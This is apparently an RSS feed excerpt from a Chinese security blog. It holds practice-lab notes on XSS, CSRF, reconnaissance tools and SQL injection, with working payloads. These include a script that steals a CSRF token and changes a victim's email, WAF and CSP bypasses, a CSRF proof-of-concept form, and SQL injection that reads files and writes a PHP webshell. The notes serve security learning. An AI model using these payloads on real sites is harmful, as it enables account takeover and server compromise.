&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;var req = new XMLHttpRequest ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.onload = handleResponse;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.open (&amp;#x27;get&amp;#x27;,&amp;#x27;/my-account&amp;#x27;,true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;req.send ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function handleResponse () &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var token = this.responseText.match (/name=&amp;quot;csrf&amp;quot; value=&amp;quot;(\w+)&amp;quot;/)[1];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var changeReq = new XMLHttpRequest ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    changeReq.open (&amp;#x27;post&amp;#x27;, &amp;#x27;/my-account/change-email&amp;#x27;, true);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    changeReq.send (&amp;#x27;csrf=&amp;#x27;+token+&amp;#x27;&amp;amp;email=test@test.com&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过 burp intruder 配合 XSS cheat sheet 绕过 WAF，主要是通过字典找到 WAF 遗漏的标签和指令，从而根据这些漏洞实现攻击。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一种新的触发方法：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;xss id=x onfocus=alert (document.cookie) tabindex=1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
tabindex 将该标签设置为可以聚焦，之后可以在 URL 结尾处使用 #x 聚焦该标签，从而触发 onfocus 事件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一段 payload：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;animatetransform onbegin=alert (1)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;rel=&amp;quot;canonical&amp;quot; 标签用于解决由于网址形式不同而内容相同造成的内容重复问题，各大搜索引擎只显示该标签后续跟的 href 指定的 url。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一种 payload。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;accesskey=&amp;#x27;x&amp;#x27;onclick=&amp;#x27;alert (1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
accesskey 属性用来指定使元素获得焦点的快捷键。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;目前见过两种绕过 \ 的方法，一种是重复标签，一种是提前闭合。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTML 对标签标签和 &amp;amp; apos; 先处理，之后才会有 javascript 进行处理，可以利用这一特性实现绕过。&lt;br /&gt;
22.JavaScript template literal 的特征，如果 `` 之间包含 ${code}，就会执行 code。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;遇到 script 标签后，html 会停止解析并交给 javascript 解析，直到运行完毕。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用 /**/ 来代替空格。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;不带括弧调用函数。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;onerror=alert;throw 1337&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&amp;#123;onerror=alert&amp;#125;throw 1337&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;throw onerror=alert,&amp;#x27;some string&amp;#x27;,123,&amp;#x27;haha&amp;#x27;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&amp;#123;onerror=eval&amp;#125;throw&amp;#x27;=alert\x281337\x29&amp;#x27;&amp;lt;/script&amp;gt;   Chrome&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&amp;#123;onerror=eval&amp;#125;throw&amp;#123;lineNumber:1,columnNumber:1,fileName:1,message:&amp;#x27;alert\x281\x29&amp;#x27;&amp;#125;&amp;lt;/script&amp;gt;  Firefox &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&amp;#123;onerror=prompt&amp;#125;throw&amp;#123;lineNumber:1,columnNumber:1,fileName:&amp;#x27;second argument&amp;#x27;,message:&amp;#x27;first argument&amp;#x27;&amp;#125;&amp;lt;/script&amp;gt; Firefox&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;TypeError.prototype.name =&amp;#x27;=/&amp;#x27;,0 [onerror=eval][&amp;#x27;/-alert (1)//&amp;#x27;]&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a [12]+[1337]+a [13]&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;小结。&lt;br /&gt;
当 XSS 在 HTML 的 tag 之间时，尝试引入新的 tag。&lt;br /&gt;
当 XSS 在 HTML 的 tag 属性中时：1. 尝试闭合 tag 并引入新的 tag。2. 尝试闭合属性并引入新的属性。3. 检查该属性本身能否触发 XSS。&lt;br /&gt;
当 XSS 在 JavaScript 中时：尝试闭合当前 script 标签并引入新的 script。&lt;br /&gt;
当 XSS 在 JS 中的字符串中时：1. 尝试闭合两边的引号。如果 JS 对其中的符号进行了转义（\）, 可以尝试绕过 \。有时 XSS 能使用的字段也会被限制，可以尝试一些特殊的注入方式。&lt;br /&gt;
当 XSS 处于 JS 中，并且这个 JS 处于 HTML tag 中：可以尝试使用 HTML 编码绕过。&lt;br /&gt;
当 XSS 处于 JS 模板字符串中：有特殊的执行方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Dangling markup，一种逃脱标签并发起访问的方式。配合使用 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1dpbmRvdy5uYW1l&#34;&gt;Window.name&lt;/span&gt; 为表单和超链接提供目标，从而绕过 CSP。&lt;br /&gt;
28.&lt;br /&gt;
HTML 中的 input 如果有 name 属性，那就可以通过 get 传值，数据就会被提交到表单里，但是还不会发包。&lt;br /&gt;
29. 绕过 edge 的 csp&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://www.paypal.com/webapps/xoonboarding?values=etc&amp;amp;token=SOMETOKEN;_&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;csrf-跨站请求攻击&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csrf-跨站请求攻击&#34;&gt;#&lt;/a&gt; CSRF (跨站请求攻击)&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;第一道题是使用的 burp 自带的 payload 生成工具，生成的 payload 如下。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;script&amp;gt;history.pushState (&amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;, &amp;#x27;/&amp;#x27;)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;form action=&amp;quot;URL&amp;quot; method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;email&amp;quot; value=&amp;quot;EMAIL_ADDRESS&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit request&amp;quot; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      document.forms [0].submit ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;有的网页会检查 token，但更换下请求方式可能能绕过。&lt;/li&gt;
&lt;li&gt;更改要检查的 token 名可能也能绕过。&lt;/li&gt;
&lt;li&gt;可以考虑有的网站生成 token 后，没有和当前用户 session 绑定，因此如果当前 token 没有用于验证，可能会在后台持续存在。因此可以截获一段 request 并复制其 token，之后 drop 掉该 request，此时这段 token 便可用于 CSRF 包的构筑 ，因为没有与我的 session，victim 便可以用这个 token 修改他自己的包。&lt;/li&gt;
&lt;li&gt;如果 token 与用户的 cookie 绑定，而用的 request 修改 session 后可能会导致用户退出，但修改 cookie 不会，则 cookie 可能并未与 session 绑定，因此可以尝试用 xss 漏洞配合 set-cookie 修改用户的 cookie，使其与自己的 payload 中的 token 一致。&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/11/15/cybersecurity/information-collection/</guid>
            <title>information-collection</title>
            <link>http://ericcd.com/2022/11/15/cybersecurity/information-collection/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Tue, 15 Nov 2022 21:57:34 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些信息搜集工具。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;子域名收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#子域名收集&#34;&gt;#&lt;/a&gt; 子域名收集&lt;/h1&gt;
&lt;p&gt;1.Knockpy&lt;br /&gt;
2.Sublist3r&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xhL1N1Ymxpc3Qzcg==&#34;&gt;https://github.com/aboul3la/Sublist3r&lt;/span&gt;&lt;br /&gt;
3.Google dorks&lt;br /&gt;
4.GoogDrker&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1plcGhyRmlzaC9Hb29nRDBya2Vy&#34;&gt;https://github.com/ZephrFish/GoogD0rker&lt;/span&gt;&lt;br /&gt;
5.Amass&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL09XQVNQL0FtYXNz&#34;&gt;https://github.com/OWASP/Amass&lt;/span&gt;&lt;br /&gt;
6.curl&lt;br /&gt;
7. 自定义脚本&lt;/p&gt;
&lt;p&gt;#Web 指纹&lt;br /&gt;
 1.curl&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  curl -i -X OPTIONS url&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
2.NMAP&lt;br /&gt;
3. 自定义脚本&lt;/p&gt;
&lt;h1 id=&#34;应用识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用识别&#34;&gt;#&lt;/a&gt; 应用识别&lt;/h1&gt;
&lt;p&gt;1.Wappalyzer&lt;br /&gt;
2.Whatruns&lt;br /&gt;
3.WafW00f&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=&#34;&gt;https://github.com/EnableSecurity/wafw00f&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h1&gt;
&lt;p&gt;1.dirb&lt;br /&gt;
2.dirsearch&lt;br /&gt;
3.dir buster&lt;br /&gt;
4.nikto&lt;br /&gt;
5.Aquatone&lt;br /&gt;
6.burp intruder&lt;br /&gt;
7. 各类字典&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RhbmllbG1pZXNzbGVyL1NlY0xpc3Rz&#34;&gt; https://github.com/danielmiessler/SecLists&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;隐藏参数发现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#隐藏参数发现&#34;&gt;#&lt;/a&gt; 隐藏参数发现&lt;/h1&gt;
&lt;p&gt;1.Arjun&lt;br /&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1VsdGltYXRlSGFja2Vycy9Bcmp1bg==&#34;&gt;https://github.com/UltimateHackers/Arjun&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;搜索引擎&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索引擎&#34;&gt;#&lt;/a&gt; 搜索引擎&lt;/h1&gt;
&lt;p&gt;1.shodan&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# *country*: 找出指定国家的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *hostname*: 找出指定主机名的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *port*: 找出指定端口的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *os*: 找出指定系统版本的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *before/after*: 指定某个时期的资产数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# *city*: 找出指定城市的资产数据 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
2.Censys&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/09/20/cybersecurity/pikachu/</guid>
            <title>pikachu</title>
            <link>http://ericcd.com/2022/09/20/cybersecurity/pikachu/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Tue, 20 Sep 2022 20:21:49 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些在使用 pikahcu 练习时用到的命令。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;sql-注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sql-注入&#34;&gt;#&lt;/a&gt; SQL 注入&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;获取数据库名&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select database ()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;获取表名&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select group_concat (table_name) from information_schema.tables where table_schema=database ()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;获取列名&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select group_concat (table_name) from information_schema.columns where table_name=&amp;#x27; 表名 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;读文件&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select load_file (&amp;#x27;Path&amp;#x27;) from 表名 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;写文件&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# union select &amp;#x27;&amp;lt;!php assert ($_POST [1];?)&amp;gt;&amp;#x27; into outfile &amp;#x27;Path&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;li&gt;报错回显&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# and updatexml (1,concat (0x7e,(select database ()),0x7e),1))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/08/31/cybersecurity/linux-command/</guid>
            <title>linux-command</title>
            <link>http://ericcd.com/2022/08/31/cybersecurity/linux-command/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Wed, 31 Aug 2022 15:02:26 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些 linux 环境下会用到的命令。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;设置代理。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# export http_proxy=&amp;#x27;http://windows 的 ip: 代理端口 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# curl -vv google.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global https.proxy http://windows 的 ip: 代理端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global https.proxy https://windows 的 ip: 